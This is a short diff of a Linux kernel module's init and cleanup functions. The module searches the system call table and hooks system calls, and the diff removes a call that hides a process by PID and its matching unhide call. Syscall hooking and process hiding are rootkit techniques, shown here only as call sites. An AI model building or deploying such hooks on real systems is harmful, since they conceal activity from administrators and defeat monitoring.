@@ -124,12 +124,10 @@ int init_module(void) {
   printk(KERN_INFO "prime module started");
   search_sys_call_table();
   hook_syscall();
-  hide_process((pid_t)1621);
   return 0;
 }
 
 void cleanup_module(void) {
   unhook_syscall();
-  unhide_process();
   printk(KERN_INFO "prime module stopped");
 }
